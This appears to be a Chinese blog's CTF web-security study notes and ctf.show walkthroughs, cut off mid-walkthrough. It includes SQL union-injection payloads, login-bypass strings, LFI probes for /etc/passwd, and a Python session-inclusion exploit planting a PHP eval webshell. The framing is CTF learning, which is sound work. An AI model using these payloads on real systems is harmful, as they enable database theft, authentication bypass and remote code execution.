  <div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">          Hello!敬请T期待</span><br><span class="line">       <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">       x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;intro&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">       x.<span class="property">innerHTML</span>=<span class="string">&#x27;HELLO WORLD!&#x27;</span>; </span></span><br><span class="line"><span class="language-javascript">       </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<blockquote>
<p>将元素该为框架iframe框架</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;&lt;ifream src=&#x27;https://kingwempity.github.io/&#x27;&gt;&lt;/ifream&gt;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>动态创建HTML内容</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title class_">Date</span>());<span class="comment">//向页面中写入当前时间</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;ifrema src=&#x27;https://kingwempity.github.io/&#x27;&gt;&lt;/ifrema&gt;&quot;</span>)<span class="comment">//向页面中写入框架</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>示例</p>
<blockquote>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">title</span>&gt;</span>kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">         Hello!敬请T期待</span><br><span class="line">     <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">     	<span class="keyword">function</span> <span class="title function_">changetext</span>(<span class="params">id</span>)</span></span><br><span class="line"><span class="language-javascript">         &#123;</span></span><br><span class="line"><span class="language-javascript">             id.<span class="property">innerHTML</span>=<span class="string">&quot;Kingwempity@敬请T期待&quot;</span>;<span class="comment">//点击后变化的内容</span></span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;changetext(this)&quot;</span>&gt;</span></span><br><span class="line">         点我会发生变化o_o哦！</span><br><span class="line">     <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><blockquote>
<p>BOM:浏览器对象模型(Browser Object Model)</p>
</blockquote>
<blockquote>
<p>让浏览器来警告用户:</p>
<p>警告弹窗alert()</p>
<p>确认弹窗confirm()</p>
<p>提示弹窗prompt()</p>
<p>以上弹窗常用于简单的调试和信息展示。例如XSS漏洞测试</p>
</blockquote>
<blockquote>
<p>获取用户cookie（通常为浏览器发给用户客户端的一小段文本信息）</p>
<blockquote>
<p>常见场景：</p>
<p>用户输入用户名和密码成功登录网站后，网站会生成一个cookie给用户，当作用户凭证</p>
</blockquote>
<p>cookie一般在控制台的network或Application中可以查看</p>
<ul>
<li><p>获取Cookie</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span><span class="comment">//获取cookie</span></span><br></pre></td></tr></table></figure></div>


</li>
<li><p>修改写入Cookie</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">doucment.<span class="property">cookie</span>=<span class="string">&quot;写入值&quot;</span>#值的形式key=value</span><br></pre></td></tr></table></figure></div>


</li>
<li><p>显示cookie</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure></div></li>
</ul>
</blockquote>
<blockquote>
<p>获取浏览器屏幕信息</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="variable language_">window</span>.)screen</span><br></pre></td></tr></table></figure></div>



<p>获取&#x2F;控制用户页面的URL</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span><span class="comment">//获取当前页面url</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span><span class="comment">//获取当前页面url</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;https://kingwempity.github.io/&quot;</span><span class="comment">//控制当前页面url</span></span><br></pre></td></tr></table></figure></div>



<p>获取访问者浏览器信息</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="variable language_">window</span>.)navigator</span><br></pre></td></tr></table></figure></div>



<p>操作浏览器窗口</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;https://kingwempity.github.io/&quot;</span>)<span class="comment">//打开页面</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">close</span>(<span class="string">&quot;https://kingwempity.github.io/&quot;</span>)<span class="comment">//关闭页面</span></span><br></pre></td></tr></table></figure></div>



</blockquote>
<p>敬请T期待！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Web</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>webctf</title>
    <url>/2024/03/13/webctf/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h1 id="CTF-WEB"><a href="#CTF-WEB" class="headerlink" title="CTF_WEB"></a>CTF_WEB</h1><h2 id="SQL注入：联合注入"><a href="#SQL注入：联合注入" class="headerlink" title="SQL注入：联合注入"></a>SQL注入：联合注入</h2><p>1、数据库为mysql的爆库、爆表、爆字段、爆值的语句：</p>
<p><strong>爆库：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,database();#查看此处有多字段</span><br></pre></td></tr></table></figure></div>

<p><strong>爆表：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database(); #   </span><br></pre></td></tr></table></figure></div>

<p><strong>爆字段：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;表名&quot;; # </span><br></pre></td></tr></table></figure></div>

<p><strong>爆值：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,字段 from 表名; #   </span><br></pre></td></tr></table></figure></div>

<p>例子：</p>
<blockquote>
<p>常规套路：</p>
<p>1、查字段</p>
<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>order<span class="comment">/**/</span>by<span class="comment">/**/</span><span class="number">3</span>#admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure></div>

<p>2、查库(web2)</p>
<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">database</span>(),<span class="number">3</span>#</span><br></pre></td></tr></table></figure></div>

<p>3、查表（flag,user）</p>
<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name),<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="symbol">&#x27;web2</span>&#x27;#</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name),<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="title function_ invoke__">database</span>()#(模板)</span><br></pre></td></tr></table></figure></div>

<p>4、查字段flag</p>
<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name),<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name=<span class="symbol">&#x27;flag</span>&#x27;#</span><br></pre></td></tr></table></figure></div>

<p>5、查字段flag内容</p>
<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,flag,<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>flag#</span><br></pre></td></tr></table></figure></div>


</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_1.png">*</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_2.png" alt="ctfshow_web6_2"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_3.png" alt="ctfshow_web6_3"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_4.png" alt="ctfshow_web6_4"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_5.png" alt="ctfshow_web6_5"></p>
<p>注意查找字段图中红色字体错误了，应该为information_schema.columns&#x2F;**&#x2F;,图中column少了s</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_6.png" alt="ctfshow_web6_6"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_7.png" alt="ctfshow_web6_7"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_8.png" alt="ctfshow_web6_8"></p>
<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>实战例子：</p>
<p>CTFshow&#x2F; easy_include</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>代码解释：</p>
<blockquote>
<p>观察cookie，发现自动开启了session，直接session文件包含</p>
<p>如果能获取PHPSESSID<br>    “请求 Cookie”: {<br>        <strong>“PHPSESSID”: “a5c4fd8ef729d435160c08a37d20ed7a”</strong><br>    }</p>
</blockquote>
<p>EXP:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># Author:ctfshow-h1xa</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;localhost/tmp/sess_ctfshow&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;system(&quot;cat /flag_is_here.txt&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data,files=file,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>



<h1 id="php文件漏洞"><a href="#php文件漏洞" class="headerlink" title="php文件漏洞"></a>php文件漏洞</h1><p><strong>get方式查看文件漏洞</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/etc/passwd  </span><br><span class="line">#GET /?url=/etc/passwd HTTP/1.1</span><br><span class="line">#若出现大串文件，则有文件漏洞</span><br><span class="line">#($_GET[&#x27;url&#x27;])极有可能含有文件漏洞</span><br></pre></td></tr></table></figure></div>

<p><strong>使用php协议</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://input</span><br><span class="line">#GET /?url=php://input HTTP/1.1</span><br><span class="line">#可以访问请求的原始数据的只读流;</span><br><span class="line">#enctype=&quot;multipart/form-data&quot;的时候php://input是无效的;</span><br><span class="line"></span><br><span class="line">?url=php://output</span><br><span class="line">#GET /?url=php://output HTTP/1.1</span><br><span class="line">#一个只写的数据流，允许以print和echo一样的方式写入到输出缓冲区</span><br><span class="line"></span><br><span class="line">?url=php://fd</span><br><span class="line">#GET /?url=php://fd HTTP/1.1</span><br><span class="line">#允许直接访问指定的文件描述符。例如：php://fd/3引用了文件描述符3.</span><br></pre></td></tr></table></figure></div>

<p><strong>查看PHP下的文夹使用ls</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>查看php下的文件夹中的文件内容cat</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat 文件夹名称&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>查看文件日志的文件夹</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure></div>



<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><blockquote>
<p> ‘r 1&#x3D;1 #</p>
<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p> 账号： admin<br> 密码：admin</p>
<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p> 账号：admin<br> 密码：admin888</p>
<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p> 账号：admin</p>
<p> 密码：域名名</p>
<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<h2 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h2><p> “or ‘a’&#x3D;”a<br> ‘’)or(‘a’&#x3D;’a<br> or 1&#x3D;1–<br> ‘or 1&#x3D;1–<br> a’or’ 1&#x3D;1–<br> “or 1&#x3D;1–<br> ‘or’a’&#x3D;’a<br> “or”&#x3D;”a’&#x3D;’a<br> ‘or”&#x3D;’<br> ‘or’&#x3D;’or’</p>
<p> admin’or 1&#x3D;1#<br> ‘&#x3D;’&amp;password&#x3D;’&#x3D;’<br> admin’ or 1&#x3D;1#<br> admin’&#x2F;<strong>&#x2F;or&#x2F;</strong>&#x2F;1&#x3D;1#<br> admin’&#x2F;*<br> *&#x2F;‘</p>
<p> 1 or ‘1’&#x3D;’1’&#x3D;1<br> 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br> ‘OR 1&#x3D;1%00<br> “or 1&#x3D;1%00<br> ‘xor## PHP万能密码</p>
<p> ‘or’&#x3D;’or’</p>
<p> ‘or 1&#x3D;1&#x2F;* 字符型 GPC是否开都可以使用</p>
<p> User: something<br> Pass: ‘OR ‘1’&#x3D;’1</p>
<p> jsp 万能密码</p>
<p> 1’or’1’&#x3D;’1</p>
<p> admin’ OR 1&#x3D;1&#x2F;*</p>
<p> 用户名：admin 系统存在这个用户的时候 才用得上<br> 密码：1’or’1’&#x3D;’1</p>
</blockquote>
<h1 id="万能账号"><a href="#万能账号" class="headerlink" title="万能账号"></a>万能账号</h1><blockquote>
<p>a’ or true #</p>
<p>账号：…admin’ or ‘a’&#x3D;’a 密码随便填</p>
</blockquote>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><blockquote>
<hr>
<p>&#x2F;or|-||&#x2F;|*|&lt;|&gt;|!|x|hex|(|)|+|select&#x2F;i</p>
<blockquote>
<ol>
<li><code>/</code>：这个符号表示正则表达式模式的开始和结束。</li>
<li><code>|</code>：这个符号代表“或”条件，意味着可以匹配两边的任何模式。</li>
<li>\-, \, /, \*, &lt;, &gt;, !, x, hex, (, ), +, select&#96;: 这些是正则表达式将尝试匹配的实际模式。这些模式中的一些代表特定字符，而其他一些代表某些条件。<ul>
<li><code>-</code>：匹配破折号字符。</li>
<li><code>\\</code>：匹配反斜杠字符。</li>
<li><code>\/</code>：匹配正斜杠字符。</li>
<li><code>\\*</code>：匹配星号字符。</li>
<li><code>\&lt;</code>：匹配单词的开头。</li>
<li><code>\&gt;</code>：匹配单词的结尾。</li>
<li><code>\!</code>：匹配感叹号字符。</li>
<li><code>x</code>：匹配字母 ‘x’。</li>
<li><code>hex</code>：匹配字符串 ‘hex’。</li>
<li><code>\(</code>：匹配左括号。</li>
<li><code>\)</code>：匹配右括号。</li>
<li><code>\+</code>：匹配加号。</li>
<li><code>select</code>：匹配字符串 ‘select’。</li>
</ul>
</li>
</ol>
</blockquote>
<p>可以使用管道符||绕过和使用取反符号~~绕过</p>
</blockquote>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf.show_web</title>
    <url>/2024/02/20/ctf-show-web/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="CTF-show秀"><a href="#CTF-show秀" class="headerlink" title="CTF.show秀"></a>CTF.show秀</h2><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_1.png" alt="ctf.show_web4_1"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_2.png" alt="ctf.show_web4_2"></p>
<blockquote>
<p>一个文件包含漏洞题目,<strong>日志注入</strong></p>
</blockquote>
<blockquote>
<p><u>使用include()函数接收url参数,include()函数包含的文件会被执行,从而造成任意代码执行,或者配合伪协议获取敏感文件甚至getshell;</u></p>
<p>本题伪协议不起作用,我们可以通过日志注入进行任意命令执行,从而getshell</p>
</blockquote>
<h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_1.png" alt="ctf.show_web5_1"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_2.png" alt="ctf.show_web5_2"></p>
<blockquote>
<p>传递两个参数,一个字符串,一个数字,并且两个参数的md5值必须相同,我们可以利用<strong>md5的0e漏洞进行绕过</strong></p>
<p>通过GET请求传递两个参数v1和v2,并且参数v1必须是纯字母字符串,参数v2必须是数字或者数字字符串,并且两个参数的md5值必须相等</p>
</blockquote>
<blockquote>
<p>0e绕过是指:0e开头的字符串在参与弱类型比较时,会被当做科学计数法,结果转换为0;</p>
</blockquote>
<blockquote>
<ul>
<li><strong>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</strong></li>
<li><strong>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</strong></li>
</ul>
</blockquote>
<blockquote>
<p>两个md5值进行弱类型比较</p>
<blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708)</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>MD5加密后会变成这个样子</p>
<blockquote>
<p>0e830400451993494058024219903391 &#x3D;&#x3D; 0e462097431906509019562988736854</p>
</blockquote>
<p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p>
<blockquote>
<p>0&#x3D;&#x3D;0</p>
</blockquote>
<p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等</p>
</blockquote>
<p><em><strong><u>常用的MD5加密后以0E开头的有</u></strong></em></p>
<blockquote>
<p>​    QNKCDZO<br>​    240610708<br>​    byGcY<br>​    sonZ7y<br>​    aabg7XSs<br>​    aabC9RqS<br>​    s878926199a<br>​    s155964671a<br>​    s214587387a<br>​    s1091221200a</p>
</blockquote>
<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><blockquote>
<p>SQL联合注入</p>
</blockquote>
<blockquote>
<p>打开题目看见文章列表，随机点击，点第一个</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_1.png" alt="ctfshow_web7_1"></p>
<blockquote>
<p>发现显示文章，本想搜索flag,发现没有，看见url中id&#x3D;1</p>
<p><strong><u>从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</u></strong></p>
<p>首先判断注入点,输入以下payload,使SQL恒成立,发现显示文章成功</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/1</span><br></pre></td></tr></table></figure></div>

<p>在输入以下payload,使SQL恒不成立,发现显示不出文章，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/0</span><br></pre></td></tr></table></figure></div>

<p>由此可以判断页面存在SQL注入,注入点为<u><strong>数值型注入</strong></u>,页面中有显示位,可以尝试<u><strong>联合注入</strong></u>进行脱库</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_2.png" alt="ctfshow_web7_2"></p>
<blockquote>
<p>先来判断显示位,此处id传一个**-1**,<strong>由于id通常不为负数,后端根据id查询不到内容</strong>,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_3.png" alt="ctfshow_web7_3"></p>
<blockquote>
<p>判断数据库</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,database(),3#</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_4.png" alt="ctfshow_web7_4"></p>
<blockquote>
<p>查看web数据库中的flag表</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3#</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_5.png" alt="ctfshow_web7_5"></p>
<blockquote>
<p>查看flag表中的flag字段</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;),3#</span><br></pre></td></tr></table></figure></div>

<p>也可使用</p>
